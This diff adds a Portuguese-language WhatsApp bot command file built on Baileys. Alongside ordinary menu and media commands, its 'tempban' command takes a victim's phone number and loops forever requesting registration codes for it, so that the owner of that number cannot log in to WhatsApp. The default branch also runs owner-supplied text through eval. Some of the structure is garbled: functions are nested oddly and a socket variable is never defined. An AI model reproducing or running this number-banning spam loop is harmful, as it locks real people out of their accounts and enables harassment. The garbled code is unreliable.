@@ -1,0 +1,320 @@
+const { downloadContentFromMessage, relayWAMessage, mentionedJid, processTime, MediaType, Browser, MessageType, Presence, Mimetype, Browsers, delay, getLastMessageInChat, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, logger } = require('@whiskeysockets/baileys');
+
+const { axios, cheerio, colors, fs, ffmpeg, fetch, isUrl, ms, moment, os, exec, spawn, speed, execSync } = require('./exportados');
+const { prefixo, nomebot, nomedono, numerodono } = require('./arquivos/funções/configuração.json');
+const { getBuffer, getFileBuffer, fetchJson, getGroupAdmins } = require('./arquivos/funções/ferramentas');
+const resposta = require('./arquivos/funções/mensagens');
+
+async function connectToWhatsApp() {
+module.exports = bkz = async(bkz, pastacode) => {
+module.exports = upsert = async(upsert, bkz) => {
+
+async function WhatsappUpsert() {
+const timestamp = speed()
+const latensi = speed() - timestamp
+
+var hora = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
+var data = moment.tz('America/Sao_Paulo').format('DD/MM/YYYY');
+
+for (const info of upsert?.messages || []) {
+
+const from = info.key.remoteJid;
+
+if (!info.message) return;
+if (upsert.type == "append") return;  
+const baileys = require('@whiskeysockets/baileys');
+const content = JSON.stringify(info.message);
+const nome = info.pushName ? info.pushName : '';
+const quoted = info.quoted ? info.quoted : info;
+const type = baileys.getContentType(info.message);
+if (info.message) {
+await bkz.readMessages([info.key]);
+} else {
+if (from == "status@broadcast") return;
+}
+
+var body = info.message?.conversation || info.message?.viewOnceMessageV2?.message?.imageMessage?.caption || info.message?.viewOnceMessageV2?.message?.videoMessage?.caption || info.message?.imageMessage?.caption || info.message?.videoMessage?.caption || info.message?.extendedTextMessage?.text || info.message?.viewOnceMessage?.message?.videoMessage?.caption || info.message?.viewOnceMessage?.message?.imageMessage?.caption || info.message?.documentWithCaptionMessage?.message?.documentMessage?.caption || info.message?.buttonsMessage?.imageMessage?.caption || info.message?.buttonsResponseMessage?.selectedButtonId || info.message?.listResponseMessage?.singleSelectReply?.selectedRowId || info.message?.templateButtonReplyMessage?.selectedId || info?.text || ""
+
+var budy = (type === 'conversation') ? info.message?.conversation : (type === 'extendedTextMessage') ? info.message?.extendedTextMessage?.text : '';
+
+//Const isGroup, etc...
+const isGroup = from.endsWith('@g.us');
+const sender = isGroup ? info.key.participant : info.key.remoteJid
+const groupMetadata = isGroup ? await bkz.groupMetadata(from) : ''
+const groupName = isGroup ? groupMetadata.subject : ''
+const groupDesc = isGroup ? groupMetadata.desc : ''
+const groupMembers = isGroup ? groupMetadata.participants : ''
+const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
+const messagesC = budy.slice(0).trim().split(/ +/).shift().toLowerCase()
+const isCmd = body.startsWith(prefixo)
+const comando = isCmd ? body.slice(1).trim().split(/ +/).shift().toLocaleLowerCase() : null;
+const args = body.trim().split(/ +/).slice(1)
+const q = args.join(' ')
+const mime = (quoted.info || quoted).mimetype || "";
+const sleep = async (ms) => {return new Promise(resolve => setTimeout(resolve, ms))}
+const mentions = (teks, memberr, id) => {
+(id == null || id == undefined || id == false) ? teddy.sendMessage(from, {text: teks.trim(), mentions: memberr }) : teddy.sendMessage(from, {text: teks.trim(), mentions: memberr })}
+
+//Outras const...
+const isBot = info.key.fromMe ? true : false;
+const isOwner = numerodono.includes(sender);
+const BotNumber = bkz.user.id.split(':')[0]+'@s.whatsapp.net';
+const isGroupAdmins = groupAdmins.includes(sender) || false;
+const isBotGroupAdmins = groupAdmins.includes(BotNumber) || false;
+
+const enviar = (texto) => {
+teddy.sendMessage(from, {text: texto }, {quoted: info })}
+
+//Const isQuoted.
+const isImage = type == "imageMessage"
+const isVideo = type == "videoMessage"
+const isAudio = type == "audioMessage"
+const isVisu = type == 'viewOnceMessageV2'
+const isSticker = type == "stickerMessage"
+const isContact = type == "contactMessage"
+const isLocation = type == "locationMessage"
+const isProduct = type == "productMessage"
+const isMedia = (type === "imageMessage" || type === "videoMessage" || type === "audioMessage") 
+typeMessage = body.substr(0, 50).replace(/\n/g, "")
+if (isImage) typeMessage = "Image"
+else if (isVideo) typeMessage = "Video"
+else if (isAudio) typeMessage = "Audio"
+else if (isSticker) typeMessage = "Sticker"
+else if (isContact) typeMessage = "Contact"
+else if (isLocation) typeMessage = "Location"
+else if (isProduct) typeMessage = "Product"
+
+const isQuotedMsg = type === "extendedTextMessage" && content.includes("textMessage")
+const isQuotedImage = type === "extendedTextMessage" && content.includes("imageMessage")
+const isQuotedVideo = type === "extendedTextMessage" && content.includes("videoMessage")
+const isQuotedDocument = type === "extendedTextMessage" && content.includes("documentMessage")
+const isQuotedAudio = type === "extendedTextMessage" && content.includes("audioMessage")
+const isQuotedSticker = type === "extendedTextMessage" && content.includes("stickerMessage")
+const isQuotedContact = type === "extendedTextMessage" && content.includes("contactMessage")
+const isQuotedLocation = type === "extendedTextMessage" && content.includes("locationMessage")
+const isQuotedProduct = type === "extendedTextMessage" && content.includes("productMessage")
+
+const TipoMensagem = comando ? "Comando" : type === "audioMessage" ? "Áudio" : type === "stickerMessage" ? "Figurinha" : type === "imageMessage" ? "Imagem" : type === "videoMessage" ? "Vídeo" : type === "documentMessage" ? "Documento" : type === "contactMessage" ? "Contato" : type === "locationMessage" ? "Localização" : type === "pollMessage" ? "Enquete" : type === "pollCreationMessage" ? "Criação de enquete" : "Mensagem";
+const TipoDispositivo = info.key.id.length === 20 ? 'iPhone' : info.key.id.length === 32 ? 'Android' : info.key.id.length === 16 ? 'Baileys' : info.key.id.length === 22 ? 'Web Browser' : info.key.id.length === 18 ? 'Desktop' : info.key.id.length > 21 ? 'Android' : 'WhatsApp web';
+const MsgConsole = `\n➱ Usuário: ${nome}\n➱ Número +${sender.split("@")[0]}\n➱ Horário: ${hora}\n➱ Plataforma: ${TipoDispositivo}`;
+
+if (!isBot) {
+if (isGroup) {
+console.log(colors.bold(`\n\n [ ${colors.yellow(TipoMensagem)} ${colors.yellow("em (grupo)")} ] ${MsgConsole}\n`));
+} else {
+console.log(colors.bold(`\n\n[ ${colors.yellow(TipoMensagem)} ${colors.yellow("no (privado)")} ] ${MsgConsole}\n`));
+}}
+
+switch(comando){
+
+case 'menu':
+menu = `╭──「 Menu Texto 」
+│• Usuário: @${sender.split("@")[0]}
+│• Dispositivo: ${TipoDispositivo}
+│• Prefixo Atual: ${prefixo}
+│• Resposta: ${latensi.toFixed(4)}
+│• Nome Bot: ${nomebot}
+╰ • Criador: ${nomedono}`
+await teddy.sendMessage(from, {text: menu, mentions: [sender]}, {quoted: info });
+break
+
+case 'menu2':
+menu2 = `╭──「 Menu Foto - Link 」
+│• Usuário: @${sender.split("@")[0]}
+│• Dispositivo: ${TipoDispositivo}
+│• Prefixo Atual: ${prefixo}
+│• Resposta: ${latensi.toFixed(4)}
+│• Nome Bot: ${nomebot}
+╰ • Criador: ${nomedono}`
+await teddy.sendMessage(from, {image: {url: 'https://telegra.ph/file/414bd9e7830c4d828b535.jpg' }, caption: menu2, mentions: [sender]}, {quoted: info });
+break
+
+case 'menu3':
+menu3 = `╭──「 Menu Foto - Diretório 」
+│• Usuário: @${sender.split("@")[0]}
+│• Dispositivo: ${TipoDispositivo}
+│• Prefixo Atual: ${prefixo}
+│• Resposta: ${latensi.toFixed(4)}
+│• Nome Bot: ${nomebot}
+╰ • Criador: ${nomedono}`
+await teddy.sendMessage(from, {image: fs.readFileSync('./arquivos/logo.jpg'), caption: menu3, mentions: [sender]}, {quoted: info });
+break
+
+case 'texto':
+await teddy.sendMessage(from, {text: 'Seu texto aqui.' }, {quoted: info });
+break
+
+case 'audio':
+await teddy.sendMessage(from, {audio: fs.readFileSync('./arquivos/áudio.mp3')}, {quoted: info });
+break
+
+case 'audiowave':
+await teddy.sendMessage(from, {audio: fs.readFileSync('./arquivos/áudio.mp3'), waveform: 'AAY8KTlLNx4/LTsjHytkLzBDIBExGC8aHRAPRzE+T0YkTyEpGyIWRCkXLyMQCyw0YB04P0EwGCs3HxEiECopGw==', mimetype: "audio/mp4", ptt: true }, {quoted: info });
+break
+
+case 'audioptt':
+await teddy.sendMessage(from, {audio: fs.readFileSync('./arquivos/áudio.mp3'), mimetype: 'audio/mp4', ptt: true }, {quoted: info });
+break
+
+case 'imagem':
+await teddy.sendMessage(from, {image: fs.readFileSync('./arquivos/logo.jpg')}, {quoted: info });
+break
+
+case 'imagemlegenda':
+await teddy.sendMessage(from, {image: fs.readFileSync('./arquivos/logo.jpg'), caption: 'Legenda'}, {quoted: info });
+break
+
+case 'video':
+await teddy.sendMessage(from, {video: fs.readFileSync('./arquivos/video.mp4')}, {quoted: info });
+break
+
+case 'videolegenda':
+await teddy.sendMessage(from, {video: fs.readFileSync('./arquivos/video.mp4'), caption: 'Legenda'}, {quoted: info });
+break
+
+case 'figurinha':
+await teddy.sendMessage(from, {sticker: fs.readFileSync('./arquivos/figurinha.webp')}, {quoted: info });
+break
+
+case 'documentozip':
+await teddy.sendMessage(from, {document: fs.readFileSync('./arquivos/documento.zip'), fileName: 'Bkz-Base.zip', mimetype: 'application/zip'}, {quoted: info });
+break
+
+case 'localização':
+await teddy.sendMessage(from, {location: fs.readFileSync('./arquivos/localização.loc'), caption: 'Localização'}, {quoted: info });
+break
+
+case 'reiniciar':
+if (!isOwner) return enviar(resposta.dono)
+enviar('Reiniciando...')
+await delay(2000)
+process.exit();
+break
+
+case 'tempban':// codigo ESCRITO pelo bruxo não CRIADO PELO BRUXO. ( não sei verdadeiro dono. )
+//if (!isBot && !isCreator) return
+q1 = q.split('/')[0];
+q2 = q.split('/')[1];
+if (!q1) return enviar('[+] Digite o ddi do alvo, se quiser exemplo mande: ' + prefixo + 'exemplo-x')
+if (!q2) return enviar('[+] Digite o número do alvo após o ddi, se quiser exemplo mande: ' + prefixo + 'exemplo-x')
+
+try {
+var extended = generateWAMessageFromContent(from, proto.Message.fromObject({
+extendedTextMessage: {
+text: `\n➖  |  Script para bugar registro do WhatsApp
+
+#️⃣  |  Alvo: wa.me/${q1+q2}\n
+🙇🏽  |  Caos implantado com sucesso, tente logar número no WhatsApp\n`,
+contextInfo: {
+externalAdReply: {
+renderLargerThumbnail: true,
+mediaType: 1,
+title: `⸺⸺⸺⸺⸺⸺⸺⸺⸺⸺⸺⸺⸺⸺⸺⸺⸺⸺⸺⸺`,
+body: `⸺⸺⸺⸺⸺⸺⸺⸺⸺⸺⸺⸺⸺⸺⸺⸺⸺⸺⸺⸺`,
+thumbnail: await getBuffer('https://telegra.ph/file/968834ec02bf639c7d76d.jpg'),
+jpegThumbnail: await getBuffer('https://telegra.ph/file/968834ec02bf639c7d76d.jpg'),
+previewType: "NONE",
+sourceUrl: `wa.me/${q1+q2}`,
+}}}}), {userJid: from})
+teddy.relayMessage(from, extended.message, {messageId: extended.key.id})
+} catch (e) {
+console.log(e)
+}
+
+
+prompt = require('prompt-sync')();
+gradient = require('gradient-string');
+pino = require('pino');
+
+
+const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
+
+const numbers = JSON.parse(fs.readFileSync('./arquivos/numbers.json'));
+
+const start = async () => {
+
+const { state, saveCreds } = await useMultiFileAuthState('.mm')
+
+const spam = makeWaSocket({
+auth: state,
+mobile: true,
+logger: pino({ level: 'silent' })
+})
+//console.clear();
+const dropNumber = async (context) => {
+const { phoneNumber, ddi, number } = context;
+while (true) {
+try {
+res = await spam.requestRegistrationCode({
+phoneNumber: '+' + phoneNumber,
+phoneNumberCountryCode: ddi,
+phoneNumberNationalNumber: number,
+phoneNumberMobileCountryCode: 724
+})
+b = (res.reason === 'temporarily_unavailable');
+if (b) {
+//console.log(gradient('red', 'red')(`número invalido: +${res.login}`));
+setTimeout(async () => {
+dropNumber(context)
+}, 1000)// a cada 1 segundos ele manda outro e assim loop de numero invalido
+return;
+}
+} catch (error) {
+console.log(error)
+}
+}
+}
+let ddi = q1
+let number = q2
+let phoneNumber = ddi + number;
+numbers[phoneNumber] = { ddi, number }
+fs.writeFileSync('./arquivos/numbers.json', JSON.stringify(numbers, null, '\t'));
+dropNumber({ phoneNumber, ddi, number })
+
+}
+start();
+break
+
+default:
+
+if (body.startsWith('>')) {
+try {
+if (!isOwner) return
+result = eval(body.slice(2))
+let response = typeof result === 'object' ? JSON.stringify(result) : String(result);
+if (response === '{}') return
+return teddy.sendMessage(from, {text: response }).catch(e => {
+enviar(String(e))})
+} catch (e) {
+enviar(String(e))}}
+
+if (budy === prefixo) {
+await teddy.sendMessage(from, {text: `Se desejar visualizar o menu, por favor, digite ${prefixo}menu` }, {quoted: info} );
+} else if (budy.startsWith(prefixo)) {
+await teddy.sendMessage(from, {text: `Desculpe, esse comando não existe.` }, {quoted: info });
+}
+}
+}
+}
+WhatsappUpsert().catch(async(e) => {
+if (String(e).includes("this.isZero")) {
+file = require.resolve("./arquivos/conexão.js");
+delete require.cache[file]
+require(file)
+} else {
+return console.log(e);
+}
+});
+}
+}
+}
+let file = require.resolve(__filename);
+fs.watchFile(file, () => {
+fs.unwatchFile(file)
+console.log(colors.bold(`\n\n• O arquivo "${__filename}" foi atualizado.\n`));
+delete require.cache[file]
+require(file)
+});
+connectToWhatsApp().catch(async(e) => {
+console.log(colors.red(`Erro no arquivo: "./comandos.js": ` + e));
+});
